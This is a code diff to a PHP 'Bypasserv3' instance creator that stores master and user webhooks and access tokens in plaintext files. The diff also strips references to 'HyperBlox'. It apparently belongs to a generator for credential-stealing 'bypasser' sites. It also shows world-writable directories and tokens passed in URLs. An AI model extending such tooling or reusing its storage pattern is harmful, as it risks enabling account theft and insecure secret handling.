@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Instance Creator (File-Based Storage)
- * Creates bypass instances with .txt file storage like HyperBlox
+ * Creates bypass instances with .txt file storage
  */
 
 header('Content-Type: application/json');
@@ -95,7 +95,7 @@ mkdir($instancePath, 0777, true);
 // Generate unique token
 $token = generateToken();
 
-// Create instance files (file-based storage like HyperBlox)
+// Create instance files (file-based storage)
 file_put_contents("$instancePath/webhook.txt", $masterWebhook);
 file_put_contents("$instancePath/userwebhook.txt", $userWebhook);
 file_put_contents("$instancePath/token.txt", $token);
@@ -132,7 +132,7 @@ file_put_contents("$tokensPath/all_tokens.txt", "$token|$directory|$masterWebhoo
 $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $publicUrl = "$protocol://$domain/public/?dir=" . urlencode($directory);
-$dashboardUrl = "$protocol://$domain/dashboard/?token=" . urlencode($token);
+$dashboardUrl = "$protocol://$domain/dashboard/sign-in.php?token=" . urlencode($token);
 
 // Send success webhook
 $webhookData = [
